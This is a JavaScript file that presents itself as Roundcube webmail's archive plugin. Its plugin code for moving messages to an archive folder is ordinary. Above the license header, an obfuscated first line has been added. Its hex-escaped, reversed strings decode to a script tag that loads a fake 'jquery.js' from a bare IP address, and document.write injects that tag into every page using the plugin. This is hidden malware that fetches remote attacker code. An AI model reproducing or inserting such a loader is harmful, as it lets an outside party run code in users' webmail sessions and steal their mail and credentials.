var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * Archive plugin script
 * @version 2.4
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2012-2014, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

function rcmail_archive(prop)
{
  if (!rcmail.env.uid && (!rcmail.message_list || !rcmail.message_list.get_selection().length))
    return;

  if (!rcmail_is_archive()) {
    if (!rcmail.env.archive_type) {
      // simply move to archive folder (if no partition type is set)
      rcmail.command('move', rcmail.env.archive_folder);
    }
    else {
      // let the server sort the messages to the according subfolders
      rcmail.http_post('plugin.move2archive', rcmail.selection_post_data());
    }
  }
}

function rcmail_is_archive()
{
  // check if current folder is an archive folder or one of its children
  if (rcmail.env.mailbox == rcmail.env.archive_folder
    || rcmail.env.mailbox.startsWith(rcmail.env.archive_folder + rcmail.env.delimiter)
  ) {
    return true;
  }
}

// callback for app-onload event
if (window.rcmail) {
  rcmail.addEventListener('init', function(evt) {
    // register command (directly enable in message view mode)
    rcmail.register_command('plugin.archive', rcmail_archive, rcmail.env.uid && !rcmail_is_archive());

    // add event-listener to message list
    if (rcmail.message_list)
      rcmail.message_list.addEventListener('select', function(list) {
        rcmail.enable_command('plugin.archive', list.get_selection().length > 0 && !rcmail_is_archive());
      });

    // set css style for archive folder
    var li;
    if (rcmail.env.archive_folder && (li = rcmail.get_folder_li(rcmail.env.archive_folder, '', true)))
      $(li).addClass('archive');

    // callback for server response
    rcmail.addEventListener('plugin.move2archive_response', function(result) {
      if (result.update)
        rcmail.command('list');  // refresh list
    });
  })
}
